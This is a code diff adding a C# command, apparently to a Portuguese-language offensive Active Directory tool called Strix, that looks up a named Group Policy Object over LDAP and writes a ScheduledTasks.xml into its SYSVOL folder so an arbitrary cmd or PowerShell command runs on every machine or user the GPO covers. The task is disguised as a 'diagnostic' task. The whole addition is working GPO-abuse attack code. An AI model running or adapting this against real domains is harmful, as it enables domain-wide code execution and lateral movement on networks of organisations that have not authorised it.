@@ -1692,6 +1692,218 @@ namespace Strix
             }
         }
 
+            public static void CreateGPOScheduledTask(string[] args)
+            {
+                  if (args.Length != 5)
+                  {
+                        Console.WriteLine("Uso: strix.exe gposcheduletask <GPO> <cmd|powershell> <machine|user> \"<comando>\"");
+                        return;
+                  }
+
+                  string gpoName = args[1];
+                  string commandType = args[2].ToLower();
+                  string scope = args[3].ToLower();
+                  string command = args[4].Trim();
+
+                  if (commandType != "cmd" && commandType != "powershell")
+                  {
+                        Console.WriteLine("[-] Tipo invalido. Use cmd ou powershell.");
+                        return;
+                  }
+
+                  if (scope != "machine" && scope != "user")
+                  {
+                        Console.WriteLine("[-] Escopo invalido. Use machine ou user.");
+                        return;
+                  }
+
+
+                  try
+                  {
+                        string defaultNC;
+                        string configurationNC;
+                        string server;
+
+                        GetGpoDirectoryContext(null, out defaultNC, out configurationNC, out server);
+
+                        string gpoGuid = null;
+                        string gpoFileSysPath = null;
+
+
+                        using (DirectoryEntry entry = new DirectoryEntry("LDAP://" + server + "/" + defaultNC))
+                        using (DirectorySearcher searcher = new DirectorySearcher(entry))
+                        {
+                              searcher.Filter = "(&(objectClass=groupPolicyContainer)(displayName=" +
+                                    EscapeLdapFilterValue(gpoName) + "))";
+
+                              searcher.PropertiesToLoad.Add("name");
+                              searcher.PropertiesToLoad.Add("gPCFileSysPath");
+
+
+
+                              SearchResult result = searcher.FindOne();
+
+                              if (result == null)
+                              {
+                                    Console.WriteLine("[-] GPO nao encontrada: " + gpoName);
+                                    return;
+                              }
+
+                              gpoGuid = result.Properties["name"][0].ToString();
+                              gpoFileSysPath = result.Properties["gPCFileSysPath"][0].ToString();
+
+                        }
+                        
+                   
+                        string scopeDirectory = scope == "machine" ? "Machine" : "User";
+
+                        string outputDirectory = System.IO.Path.Combine(
+                              gpoFileSysPath,
+                              scopeDirectory,
+                              "Preferences",
+                              "ScheduledTasks"
+                        );
+
+                        System.IO.Directory.CreateDirectory(outputDirectory);
+
+                        string executable;
+                        string arguments;
+
+                        if (commandType == "cmd")
+                        {
+                              executable = @"C:\Windows\System32\cmd.exe";
+                              arguments = "/c " + command;
+                        }
+                        else
+                        {
+                              executable = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+                              arguments = "-NoProfile -NonInteractive -Command \"" + command + "\"";
+                        }
+
+                        System.Xml.XmlDocument document = new System.Xml.XmlDocument();
+
+                        System.Xml.XmlElement root = document.CreateElement("ScheduledTasks");
+                        root.SetAttribute("clsid", "{CC63F200-7309-4ba0-B154-A71CD118DBCC}");
+                        document.AppendChild(root);
+
+                        System.Xml.XmlElement task = document.CreateElement("TaskV2");
+                        task.SetAttribute("clsid", "{D8896631-B747-47a7-84A6-C155337F3BC8}");
+                        task.SetAttribute("name", "StrixDiagnostic");
+                        task.SetAttribute("image", "0");
+                        task.SetAttribute("uid", "{" + Guid.NewGuid().ToString().ToUpper() + "}");
+                        task.SetAttribute("changed", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
+                        root.AppendChild(task);
+
+                        System.Xml.XmlElement properties = document.CreateElement("Properties");
+                        properties.SetAttribute("action", "C");
+                        properties.SetAttribute("name", "StrixuCommandGPO");
+                        properties.SetAttribute("runAs", "%LogonDomain%\\%LogonUser%");
+                        task.AppendChild(properties);
+
+                        System.Xml.XmlElement scheduledTask = document.CreateElement("Task");
+                        scheduledTask.SetAttribute("version", "1.2");
+                        properties.AppendChild(scheduledTask);
+
+                        System.Xml.XmlElement registration = document.CreateElement("RegistrationInfo");
+                        scheduledTask.AppendChild(registration);
+
+                        System.Xml.XmlElement author = document.CreateElement("Author");
+                        author.InnerText = "Strix";
+                        registration.AppendChild(author);
+
+                        System.Xml.XmlElement description = document.CreateElement("Description");
+                        description.InnerText = "Strix local diagnostic task";
+                        registration.AppendChild(description);
+
+                        System.Xml.XmlElement principals = document.CreateElement("Principals");
+                        scheduledTask.AppendChild(principals);
+
+                        System.Xml.XmlElement principal = document.CreateElement("Principal");
+                        principal.SetAttribute("id", "Author");
+                        principals.AppendChild(principal);
+
+                        System.Xml.XmlElement userId = document.CreateElement("UserId");
+                        userId.InnerText = "%LogonDomain%\\%LogonUser%";
+                        principal.AppendChild(userId);
+
+                        System.Xml.XmlElement logonType = document.CreateElement("LogonType");
+                        logonType.InnerText = "InteractiveToken";
+                        principal.AppendChild(logonType);
+
+                        System.Xml.XmlElement runLevel = document.CreateElement("RunLevel");
+                        runLevel.InnerText = "LeastPrivilege";
+                        principal.AppendChild(runLevel);
+
+                        System.Xml.XmlElement settings = document.CreateElement("Settings");
+                        scheduledTask.AppendChild(settings);
+
+                        string[,] settingValues =
+                        {
+                              { "MultipleInstancesPolicy", "IgnoreNew" },
+                              { "DisallowStartIfOnBatteries", "true" },
+                              { "StopIfGoingOnBatteries", "true" },
+                              { "AllowHardTerminate", "true" },
+                              { "StartWhenAvailable", "false" },
+                              { "RunOnlyIfNetworkAvailable", "false" },
+                              { "AllowStartOnDemand", "true" },
+                              { "Enabled", "true" },
+                              { "Hidden", "false" },
+                              { "RunOnlyIfIdle", "false" },
+                              { "WakeToRun", "false" },
+                              { "ExecutionTimeLimit", "PT1H" },
+                              { "Priority", "7" }
+                        };
+
+                        for (int i = 0; i < settingValues.GetLength(0); i++)
+                        {
+                              System.Xml.XmlElement setting = document.CreateElement(settingValues[i, 0]);
+                              setting.InnerText = settingValues[i, 1];
+                              settings.AppendChild(setting);
+                        }
+
+                        System.Xml.XmlElement actions = document.CreateElement("Actions");
+                        actions.SetAttribute("Context", "Author");
+                        scheduledTask.AppendChild(actions);
+
+                        System.Xml.XmlElement exec = document.CreateElement("Exec");
+                        actions.AppendChild(exec);
+
+                        System.Xml.XmlElement executableElement = document.CreateElement("Command");
+                        executableElement.InnerText = executable;
+                        exec.AppendChild(executableElement);
+
+                        System.Xml.XmlElement argumentsElement = document.CreateElement("Arguments");
+                        argumentsElement.InnerText = arguments;
+                        exec.AppendChild(argumentsElement);
+
+                        string outputFile = System.IO.Path.Combine(outputDirectory, "ScheduledTasks.xml");
+
+                        System.Xml.XmlWriterSettings writerSettings = new System.Xml.XmlWriterSettings();
+                        writerSettings.Encoding = new System.Text.UTF8Encoding(false);
+                        writerSettings.Indent = true;
+                        writerSettings.IndentChars = "    ";
+                        writerSettings.OmitXmlDeclaration = false;
+
+                        using (System.Xml.XmlWriter writer = System.Xml.XmlWriter.Create(outputFile, writerSettings))
+                        {
+                              document.Save(writer);
+                        }
+
+                        Console.WriteLine("[+] XML gerado com sucesso!");
+                        Console.WriteLine("    GPO: " + gpoName);
+                        Console.WriteLine("    GUID: " + gpoGuid);
+                        Console.WriteLine("    Escopo: " + scopeDirectory);
+                        Console.WriteLine("    Tipo: " + commandType);
+                        Console.WriteLine("    Comando: " + command);
+                        Console.WriteLine("    Arquivo: " + outputFile);
+                        Console.WriteLine("[*] Alteração realizada no SYSVOL.");
+                  }
+                  catch (Exception ex)
+                  {
+                        Console.WriteLine("[-] Erro ao gerar XML: " + ex.Message);
+                  }
+            }
+
         private static string ResolveGpoLinkTarget(
             string scopeType,
             string targetName,
